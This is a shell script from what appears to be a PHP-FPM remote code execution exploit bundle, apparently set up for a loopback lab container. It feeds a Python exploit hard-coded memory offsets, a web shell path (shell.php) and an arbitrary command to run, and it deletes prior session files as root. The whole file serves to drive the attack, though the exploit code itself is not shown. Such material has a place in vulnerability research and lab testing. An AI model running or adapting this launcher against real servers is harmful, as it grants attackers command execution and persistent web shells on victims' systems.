#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
port=${PHP2SHELL_FPM_ORIGIN_PORT:-9196}
workers=${PHP2SHELL_FPM_WORKERS:-1}
attempts=${PHP2SHELL_FPM_ATTEMPTS:-1}
cmd=${1:-id}

case "$port:$workers:$attempts" in
    *[!0-9:]*|'') echo "Ports, workers, and attempts must be numeric" >&2; exit 2 ;;
esac
[ "$port" -ge 1 ] && [ "$port" -le 65535 ] || exit 2
[ "$workers" -ge 1 ] || exit 2
[ "$attempts" -ge 1 ] || exit 2

artifact_dir="$bundle_dir/artifacts/fpm-rce"
mkdir -p "$artifact_dir"
proof="$artifact_dir/command-output.txt"

live_workers=$(docker top php2shell-fpm-8321 -eo pid,user,comm 2>/dev/null |
    awk '$2 == "www-data" { n++ } END { print n + 0 }')
if [ "$live_workers" -ne "$workers" ]; then
    echo "Expected $workers FPM worker(s), found $live_workers." >&2
    echo "Run ./scripts/up-fpm-rce.sh for the calibrated one-worker profile." >&2
    exit 3
fi

# These paths exist only in the loopback lab container.
docker exec -u 0 php2shell-fpm-8321 sh -lc \
    'find /tmp/php2shell-sessions -maxdepth 1 -type f -name "sess_*" -delete; rm -f /var/www/html/public/proof/shell.php'

URL="http://127.0.0.1:$port" \
WORKERS="$workers" \
ATTEMPTS="$attempts" \
PRIME_PRESS=700 \
INDEX=/fpm-index.php \
PLAIN=/plain.php \
E_OFF=0x96000 \
DT_OFF=0x8b000 \
SCALAR_PUSH=0x62058 \
ARRAY_PUSH=0x62050 \
WRITER=0x57190 \
FBASE=0x86018 \
FAKE_STR_OFF=0x20 \
FPM_SHELL=/var/www/html/public/proof/shell.php \
SHELL_URL=/proof/shell.php \
CMD="$cmd" \
PROOF="$proof" \
python3 "$bundle_dir/exploits/php8321_fpm_rce.py"

printf '\nProof saved to %s\n' "$proof"
